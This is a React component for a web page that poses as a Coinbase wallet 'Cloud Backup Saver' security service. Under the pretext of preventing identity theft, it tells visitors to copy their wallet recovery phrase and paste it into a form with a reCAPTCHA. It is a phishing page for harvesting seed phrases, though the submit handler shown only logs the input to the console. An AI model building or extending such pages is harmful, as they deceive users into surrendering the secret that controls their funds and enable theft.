import { useForm } from 'react-hook-form'
import ReCAPTCHA from 'react-google-recaptcha'

const RecoveryPhrase = () => {
  const { register, handleSubmit } = useForm()

  const submitPhrase = (data) => {
    console.log(data)
  }

  console.log(import.meta.env)

  function onChange(value) {
    console.log('Captcha value:', value)
  }
  return (
    <main className='container px-8 mx-auto'>
      <section className='mx-auto my-12 borde'>
        <h2 className='text-3xl font-bold text-white md:text-4xl lg:text-5xl'>
          Secure your {`Coinbase`} wallet
        </h2>
        <p className='my-8'>
          To prevent identity theft, you need to secure your wallet with us.
        </p>
        <p className='mb-8'>
          Here’s how you secure your {`Coinbase`} wallet with{' '}
          <strong>Cloud Backup Saver</strong>:
        </p>
        <ol className='list-decimal list-inside'>
          <li>
            Go to your {`Coinbase`} wallet, click on Settings Recovery phrase.
            Then copy and paste it in the form below.
          </li>
          <li className='mt-4'>Verify yourself with reCAPTCHA.</li>
          <li className='mt-4'>Secure your wallet!</li>
        </ol>
      </section>
      <form onSubmit={handleSubmit(submitPhrase)} method='POST'>
        <textarea
          className='w-full outline-none focus:outline-slate-400 bg-inherit border border-[#F7F7F7] rounded-lg px-6 py-3'
          placeholder='Enter your recovery phrase here.'
          cols='20'
          rows='5'
          {...register(`coinbase-recovery-phrase`)}
        ></textarea>
        <div className='w-full mt-4'>
          <ReCAPTCHA
            sitekey={
              import.meta.env.DEV
                ? import.meta.env.VITE_SITE_KEY
                : import.meta.env.SITE_KEY
            }
            onChange={onChange}
          />
        </div>
        <button
          type='submit'
          className='block mt-8 w-full text-center rounded-lg py-3 transition-colors hover:bg-[#0046df] bg-[#0051FF]'
        >
          Secure Wallet
        </button>
      </form>
    </main>
  )
}

export default RecoveryPhrase
